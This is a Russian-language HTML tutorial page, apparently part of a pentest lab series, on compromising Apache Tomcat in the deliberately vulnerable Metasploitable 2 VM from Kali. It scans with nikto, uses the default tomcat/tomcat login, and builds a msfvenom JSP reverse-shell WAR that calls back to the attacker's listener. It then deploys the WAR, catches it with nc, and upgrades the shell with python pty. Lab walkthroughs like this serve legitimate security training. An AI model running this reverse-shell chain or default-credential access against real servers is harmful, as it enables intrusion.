@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Использование Apache Tomcat на metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Использование Apache Tomcat на metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Использование Apache Tomcat на metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2s.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Использование Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Использование Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 20. Использование Apache Tomcat на в metasploitable-linux-2.0.0 - Способ 2
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+
+<p>
+Начинаем атаку на удаленную машину Metasploitable 2.
+</p>
+
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале:
+</p>
+
+<p>
+nikto -h 10.0.2.3:8180
+</p>
+
+<img src="./pict/pic138.jpg" width=1400 alt="kali linux терминал команда nikto">
+
+<p>
+Мы нашли логин/пароль - tomcat/tomcat.
+</p>
+
+<p>
+Используя msfvenom создаем полезную нагрузку webshell (команда в терминале Kali):
+</p>
+
+<p>
+msfvenom -p java/jsp_shell_reverse_tcp lhost=10.0.2.4 lport=4444 -f war > webshell1.war
+</p>
+
+<p>
+После этого в домашней папке на Kali появиться файл:
+</p>
+
+<p>
+webshell1.war
+</p>
+
+<img src="./pict/pic141.jpg" width=1400 alt="kali linux терминал команда msfvenom ls">
+
+<p>
+Следующую команду выполняем в терминале Kali:
+</p>
+
+<p>
+nc -lvnp 4444
+</p>	
+
+<p>
+где:
+</p>
+
+<p>
+-l — режим прослушивания (listen)
+<br>
+-v — подробный вывод
+<br>
+-n — не выполнять DNS-резолвинг
+<br>
+-p 4444 — слушать порт 4444
+</p>
+
+
+После запуска терминал будет просто ждать подключения.
+
+<img src="./pict/pic142.jpg" width=1400 alt="kali linux терминал команда msfvenom ls nc">
+
+<p>
+Далее в Kali открываем браузер, вводим адрес:
+</p>
+
+<p>
+http://10.0.2.3:8180/manager/html
+</p>
+
+<p>
+На запрос логин/пароль вводим tomcat/tomcat и нажимаем Sign In:
+</p>
+
+<img src="./pict/pic143.jpg" width=1400 alt="kali linux браузер">
+
+<p>
+После входа листаем вниз до секции:
+</p>
+
+<p>
+WAR file to deploy
+</p>
+
+<p>
+Жмем кнопку Browse, выбираем у нас на диске файл webshell1.war, жмем Deploy:
+</p>
+
+
+<img src="./pict/pic144.jpg" width=1400 alt="kali linux браузер">
+
+<br>
+<br>
+
+<img src="./pict/pic145.jpg" width=1400 alt="kali linux браузер">
+
+
+<p>
+Следующий шаг в браузере Kali перейти по адресу (или в панели управления нажать /webshell1):
+</p>
+
+<p>
+http://10.0.2.3:8180/webshell1/
+</p>
+
+<img src="./pict/pic146.jpg" width=1400 alt="kali linux браузер">
+
+<p>
+Далее сворачиваем браузер, что бы снова было видно окно терминала Kali, и видим что подключение есть и можно давать команды:
+</p>
+
+<img src="./pict/pic147.jpg" width=1400 alt="kali linux подключение netcat">
+
+<p>
+И тут же в этом окне терминала даем команду:
+</p>
+
+<p>
+python -c 'import pty; pty.spawn("/bin/bash")'
+</p>
+
+<img src="./pict/pic148.jpg" width=1400 alt="kali linux подключение netcat">
+
+<p>
+Теперь у нас есть командная строка Metasploitable 2, выполнена команда whoami:
+</p>
+
+<img src="./pict/pic149.jpg" width=1400 alt="kali linux подключение netcat">
+
+<p>
+В командной строке выполним еще команду ifconfig и видим IP 10.0.2.3 что указывает на Metasploitable 2:
+</p>
+
+<img src="./pict/pic150.jpg" width=1400 alt="kali linux подключение netcat">
+
+<p>
+Для выхода из командной обочки Metasploitable 2 следует нажать сочетание клавиш Ctr+C.
+</p>
+
+<p>
+Это руководство описывает создание и загрузку веб-оболочки (webshell) с помощью msfvenom. Это относится к созданию и использованию инструмента для получения удаленного доступа к системе.
+</p>
+
+<p>
+Что такое msfvenom
+</p>
+
+<p>
+msfvenom — это утилита из состава Metasploit Framework, которая умеет автоматически генерировать различные типы полезных нагрузок (payload) в разных форматах.
+</p>
+
+<p>
+Например, она может создавать файлы для разных платформ и технологий:
+</p>
+
+<p>
+Windows (EXE);
+<br>
+Linux (ELF);
+<br>
+Java (WAR, JAR);
+<br>
+Android (APK);
+<br>
+PHP, ASP, JSP и другие.
+</p>
+
+<p>
+К примеру злоумышленник при помощи msfvenom создает EXE файл, отправляет его по электронной почте жертве, на компьютере жертвы этот EXE запускается и устанавливает связь с компьютером злоумышленника. Но антивирус может обнаружть такой EXE.
+</p>
+
+<p>
+Идея в том, что вместо того чтобы вручную писать код на Java, утилита автоматически генерирует готовое приложение, содержащее выбранную полезную нагрузку.
+</p>
+
+<p>
+Почему в примере используется WAR
+</p>
+
+<p>
+Tomcat умеет развертывать приложения в формате WAR. WAR (Web Application Archive) — это ZIP-архив специальной структуры, предназначенный для Java-веб-приложений.
+</p>
+
+<p>
+Если переименовать файл:
+</p>
+
+<p>
+webshell1.war
+</p>
+
+<p>
+в
+</p>
+
+<p>
+webshell1.zip
+</p>
+
+<p>
+то его можно открыть обычным архиватором (7-Zip, WinRAR и т.д.).
+</p>
+
+<p>
+Поэтому в учебном примере вместо самостоятельного написания index.jsp предлагается сгенерировать готовое Java-приложение в формате WAR, которое Tomcat может установить как обычное веб-приложение.
+</p>
+
+<p>
+Tomcat не знает, каким образом был создан WAR — вручную разработчиком или автоматически какой-либо утилитой.
+</p>
+
+<p>
+В данном контексте nc (Netcat) используется как часть цепочки эксплуатации для ожидания входящего соединения после запуска полезной нагрузки.
+</p>
+
+<p>
+Что такое Netcat
+</p>
+
+<p>
+nc (Netcat) — это универсальный инструмент для работы с TCP и UDP.
+</p>
+
+<p>
+Он может:
+</p>
+
+<p>
+устанавливать TCP-соединения;
+<br>
+принимать входящие TCP-соединения;
+<br>
+передавать данные между программами;
+<br>
+использоваться для диагностики сетевых сервисов.
+</p>
+
+<p>
+Как это выглядит концептуально
+</p>
+
+<p>
+Если одна программа хочет подключиться к другой, схема такая:
+</p>
+
+<pre>
+
+Программа A
+      │
+ TCP-соединение
+      │
+      ▼
+Netcat
+      │
+      ▼
+Программа B
+
+</pre>
+
+<p>
+Netcat сам по себе не является эксплойтом и не выполняет никакого кода. Он просто передает данные по сети.
+</p>
+
+<p>
+Зачем нужен nc?
+</p>
+
+<p>
+Когда JSP внутри webshell1.war выполнится на сервере, она сама инициирует TCP-подключение к твоей Kali-машине. nc просто принимает это соединение.
+</p>
+
+<p>
+Эта команда:
+</p>
+
+<p>
+python -c 'import pty; pty.spawn("/bin/bash")'
+</p>
+
+<p>
+не получает первоначальный доступ. Она улучшает уже полученную shell.
+</p>
+
+<p>
+Что происходит до этого
+</p>
+
+<p>
+После успешного выполнения JSP и обратного подключения мы обычно получаем простую оболочку, например:
+</p>
+
+<p>
+$ whoami
+<br>
+tomcat
+<br>
+$ pwd
+<br>
+/var/lib/tomcat5
+</p>
+
+<p>
+Такая оболочка называется dumb shell (неполноценная shell). У нее есть ограничения:
+</p>
+
+<p>
+не работают стрелки ↑ ↓;
+<br>
+не работает автодополнение Tab;
+<br>
+многие интерактивные программы (su, vi, nano, top) работают некорректно;
+<br>
+нет полноценного терминала (TTY).
+</p>
+
+
+<p>
+Что делает команда
+</p>
+
+<p>
+python -c 'import pty; pty.spawn("/bin/bash")'
+</p>
+
+<p>
+Разберем по частям:
+</p>
+
+<p>
+python -c — выполнить код Python прямо из командной строки.
+<br>
+import pty — импортировать модуль pty (pseudo terminal).
+<br>
+pty.spawn("/bin/bash") — запустить /bin/bash, подключив его к псевдотерминалу (PTY).
+</p>
+
+<p>
+В результате вместо простой оболочки мы получаем полноценный bash, который ведет себя гораздо ближе к обычному терминалу.
+</p>
+
+<p>
+Когда ее выполнять?
+</p>
+
+<p>
+Ее вводят уже внутри полученной оболочки.
+</p>
+
+<p>
+Например:
+</p>
+
+<pre>
+
+listening on [any] 4444 ...
+connect to [192.168.79.173] from 10.0.2.3 49352
+
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+tomcat@metasploitable:/var/lib/tomcat5$
+
+</pre>
+
+<p>
+Обратите внимание, что приглашение командной строки обычно становится более информативным (например, tomcat@metasploitable:...$), что является признаком запуска bash через PTY.
+</p>
+
+
+</body>
+</html>
